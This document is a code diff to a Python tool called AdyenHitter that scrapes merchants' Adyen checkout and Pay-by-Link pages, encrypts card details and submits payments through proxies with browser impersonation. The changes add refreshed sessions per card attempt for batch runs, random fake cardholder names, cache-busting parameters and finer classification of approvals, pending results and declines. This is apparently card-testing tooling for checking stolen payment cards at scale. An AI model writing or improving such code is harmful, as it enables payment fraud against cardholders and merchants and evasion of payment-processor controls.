@@ -198,9 +198,12 @@ def _extract_config(html: str) -> dict:
     return cfg
 
 def _merge(dst, src):
-    for k in ('clientKey', 'sessionId', 'sessionData', 'publicKey',
-              'environment', 'linkId', 'loadingContext'):
+    for k in ('clientKey', 'publicKey', 'environment', 'linkId', 'loadingContext'):
         if src.get(k) and not dst.get(k):
+            dst[k] = src[k]
+    # Always overwrite sessionId and sessionData to force refresh for batch runs
+    for k in ('sessionId', 'sessionData'):
+        if src.get(k):
             dst[k] = src[k]
     if src.get('adyen'):
         dst['adyen'] = True
@@ -278,7 +281,6 @@ class AdyenHitter:
         "Acquirer Fraud":           "fraud",
         "Issuer Suspected Fraud":   "fraud_suspected",
         "Not Permitted":            "not_permitted",
-        "Transaction Not Permitted": "not_permitted",
         "Revocation Of Auth":       "revoked",
         "Pin validation not possible": "pin_error",
         "Referral":                 "referral",
@@ -317,6 +319,8 @@ class AdyenHitter:
         if not self.url.startswith(("http://", "https://")):
             self.url = f"https://{self.url}"
         self.proxy_data = proxy_data
+        self._base_cfg: Optional[dict] = None
+        self._cached_pk: Optional[str] = None
 
     def _get_origin(self) -> str:
         parsed = urlparse(self.url)
@@ -347,9 +351,11 @@ class AdyenHitter:
                               loading_ctx: str, env: str) -> dict:
         """Fetch dropin config, sessionId, and sessionData for Pay by Link."""
         base = loading_ctx.rstrip('/')
+        # Append unique token parameter to isolate card sessions and avoid 903 conflicts
         setup_url = (
             f"{base}/session/paybylink/v1/{link_id}/setup"
             f"?d={link_id}&generateSessionData=true&generateCheckoutAttemptId=true"
+            f"&_cb={random.randint(100000, 999999)}"
         )
         origin = self._get_origin()
         hdr = {
@@ -377,8 +383,13 @@ class AdyenHitter:
                 pl = d.get('paymentLink', {})
                 if pl.get('amount'):
                     amt = pl['amount']
-                    out['amount_value']    = amt.get('value')
-                    out['amount_currency'] = amt.get('currency')
+                    amt_val = amt.get('value')
+                    if amt_val is not None:
+                        try:
+                            out['amount_value'] = int(amt_val)
+                        except (ValueError, TypeError):
+                            out['amount_value'] = amt_val
+                    out['amount_currency'] = amt.get('currency', 'USD')
                 out['pbl_status']    = pl.get('status')
                 out['pbl_reference'] = pl.get('reference')
                 out['pbl_reusable']  = pl.get('reusable', True)
@@ -395,11 +406,11 @@ class AdyenHitter:
                 out['linkId']   = link_id
                 out['pbl_base'] = base
                 
-                # Check for JWE indicators in configuration (Adyen SDK version >= 6.0.0 or explicitly declared)
+                # Check for JWE indicators strictly against sdkVersion and known JS paths
                 out['use_jwe'] = False
-                for script in d.get('theme', {}).values():
-                    if isinstance(script, str) and ('6.' in script or 'v6' in script):
-                        out['use_jwe'] = True
+                sdk_ver = str(d.get('sdkVersion') or dc.get('sdkVersion') or '')
+                if sdk_ver.startswith('6.') or sdk_ver.startswith('v6.'):
+                    out['use_jwe'] = True
         except Exception as e:
             out['error'] = f"PBL setup error: {str(e)[:80]}"
         return out
@@ -432,15 +443,39 @@ class AdyenHitter:
                 else:
                     merchant = raw_title.split('|')[0].split(' - ')[0].strip()[:30]
             
-            # Check for version indicators in HTML (like script URLs containing SDK v6)
-            if 'sdk/6.' in html or 'adyen-web/6.' in html or 'adyen.web/6.' in html:
+            # Check for version indicators strictly in HTML script tags
+            if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', html):
                 cfg['use_jwe'] = True
                 
             page_cfg = _extract_config(html)
             _merge(cfg, page_cfg)
+            # Remove any initial scraped static sessions so setup bootstraps fresh unique IDs
+            cfg['sessionId'] = None
+            cfg['sessionData'] = None
 
             for blk in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
                 _merge(cfg, _extract_config(blk))
+            cfg['sessionId'] = None
+            cfg['sessionData'] = None
+
+            if cfg['adyen'] and not cfg.get('clientKey'):
+                js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html)
+                for js in js_srcs[:6]:
+                    if not js.startswith('http'):
+                        js = urljoin(self.url, js)
+                    try:
+                        async with session.get(js, headers=hdr, timeout=8) as jr:
+                            jt = jr.text() if callable(jr.text) else jr.text
+                            # Detect version v6 in JS filenames or code content strictly
+                            if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', js) or re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', jt):
+                                cfg['use_jwe'] = True
+                            _merge(cfg, _extract_config(jt))
+                    except Exception:
+                        continue
+
+            # Strip any cached sessions extracted from javascript or html configs
+            cfg['sessionId'] = None
+            cfg['sessionData'] = None
 
             if cfg.get('linkId'):
                 lctx = cfg.get('loadingContext') or self._adyen_base(
@@ -458,32 +493,38 @@ class AdyenHitter:
                     if pbl.get(pk):
                         cfg[pk] = pbl[pk]
 
-            if cfg['adyen'] and not cfg.get('clientKey'):
-                js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html)
-                for js in js_srcs[:6]:
-                    if not js.startswith('http'):
-                        js = urljoin(self.url, js)
-                    try:
-                        async with session.get(js, headers=hdr, timeout=8) as jr:
-                            jt = jr.text() if callable(jr.text) else jr.text
-                            # Detect version v6 in JS filenames or code content
-                            if '6.' in js or 'sdk/6.' in jt or 'adyen-web/6.' in jt:
-                                cfg['use_jwe'] = True
-                            _merge(cfg, _extract_config(jt))
-                    except Exception:
-                        continue
-
         cfg['merchant'] = merchant
+        return cfg
+
+    async def _get_config(self, session) -> dict:
+        """Fetch or reuse base Adyen config, refreshing PBL session per card attempt."""
+        if self._base_cfg is None:
+            self._base_cfg = await self._scrape(session)
+            return self._base_cfg.copy()
+
+        cfg = self._base_cfg.copy()
+        if cfg.get('is_pbl') and cfg.get('linkId'):
+            lctx = cfg.get('loadingContext') or self._adyen_base(
+                cfg.get('environment', 'live')) + '/'
+            pbl = await self._bootstrap_pbl(
+                session, cfg['linkId'], lctx,
+                cfg.get('environment', 'live'))
+            _merge(cfg, pbl)
+            if pbl.get('amount_value') is not None:
+                cfg['amount_value'] = pbl['amount_value']
         return cfg
 
     # ── fetch pubkey ────────────────────────────────────────────────────────
     async def _fetch_pubkey(self, session, client_key: str, env: str) -> Optional[str]:
+        if self._cached_pk:
+            return self._cached_pk
         for ver in ('v1', 'v2'):
             url = f"{self._adyen_base(env)}/{ver}/clientKeys/{client_key}"
             try:
                 async with session.get(url, timeout=8) as r:
                     d = r.json() if callable(r.json) else r.json
                     if isinstance(d, dict) and d.get('publicKey'):
+                        self._cached_pk = d['publicKey']
                         return d['publicKey']
             except Exception:
                 pass
@@ -491,11 +532,17 @@ class AdyenHitter:
 
     async def _pay_session(self, session, encrypted: dict,
                            sid: str, sdata: str, ck: str,
-                           env: str, att_id: Optional[str] = None) -> dict:
+                           env: str, att_id: Optional[str] = None,
+                           card_num: Optional[str] = None) -> dict:
         url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
         origin = self._get_origin()
         
-        pm = {"type": "scheme", **encrypted}
+        shopper = _generate_random_shopper()
+        brand = _detect_brand(card_num)
+
+        pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}
+        if brand and brand != "scheme":
+            pm["brand"] = brand
 
         body = {
             "sessionData": sdata,
@@ -831,7 +878,7 @@ class AdyenHitter:
         # (fingerprint → challenge escalation)
         new_rc = result.get('resultCode', '')
         if new_rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
-            return await self._resolve_3ds(session, result, sid, new_sdata, ck, env, depth + 1)
+            return await self._resolve_3ds(session, result, sid, result.get('sessionData') or new_sdata, ck, env, depth + 1)
 
         return result
 
@@ -915,10 +962,18 @@ class AdyenHitter:
         rc = data.get('resultCode', '')
 
         # ── approved ──
-        if rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'):
+        if rc in ('Authorised', 'AuthenticationFinished'):
             result['success'] = True
             if not result.get('receipt_url') and data.get('url'):
                 result['receipt_url'] = data['url']
+            return result
+
+        # ── pending ──
+        if rc in ('Received', 'Pending'):
+            result['success'] = False
+            result['pending'] = True
+            result['decline_code'] = 'pending'
+            result['error'] = f"Payment {rc}"
             return result
 
         # ── 3DS ──
@@ -980,12 +1035,15 @@ class AdyenHitter:
             async with ChromeSession(impersonate="chrome131",
                                      proxies=proxies, timeout=7) as sess:
 
-                cfg = await self._scrape(sess)
+                cfg = await self._get_config(sess)
                 result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
                 if cfg.get('amount_value') is not None:
-                    val = cfg['amount_value']
-                    cur = cfg.get('amount_currency', 'USD')
-                    result['amount'] = f"{cur} {val / 100:.2f}"
+                    try:
+                        val = int(cfg['amount_value'])
+                        cur = cfg.get('amount_currency', 'USD')
+                        result['amount'] = f"{cur} {val / 100:.2f}"
+                    except (ValueError, TypeError):
+                        result['amount'] = str(cfg['amount_value'])
 
                 if not cfg.get('adyen'):
                     result['error'] = "No Adyen checkout detected on this page"
@@ -1039,7 +1097,8 @@ class AdyenHitter:
                 if sid and sdata:
                     data = await self._pay_session(
                         sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'))
+                        att_id=cfg.get('checkoutAttemptId'),
+                        card_num=card.get('card'))
                 else:
                     data = await self._pay_direct(
                         sess, enc, ck, env,
@@ -1096,13 +1155,16 @@ class AdyenHitter:
             async with ChromeSession(impersonate="chrome131",
                                      proxies=proxies, timeout=7) as sess:
 
-                # ── 1. scrape config ────────────────────────────────────────
-                cfg = await self._scrape(sess)
+                # ── 1. get config ───────────────────────────────────────────
+                cfg = await self._get_config(sess)
                 result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
                 if cfg.get('amount_value') is not None:
-                    val = cfg['amount_value']
-                    cur = cfg.get('amount_currency', 'USD')
-                    result['amount'] = f"{cur} {val / 100:.2f}"
+                    try:
+                        val = int(cfg['amount_value'])
+                        cur = cfg.get('amount_currency', 'USD')
+                        result['amount'] = f"{cur} {val / 100:.2f}"
+                    except (ValueError, TypeError):
+                        result['amount'] = str(cfg['amount_value'])
 
                 if not cfg.get('adyen'):
                     result['error'] = "No Adyen checkout detected on this page"
@@ -1154,7 +1216,8 @@ class AdyenHitter:
                 if sid and sdata:
                     data = await self._pay_session(
                         sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'))
+                        att_id=cfg.get('checkoutAttemptId'),
+                        card_num=card.get('card'))
                 else:
                     data = await self._pay_direct(
                         sess, enc, ck, env,
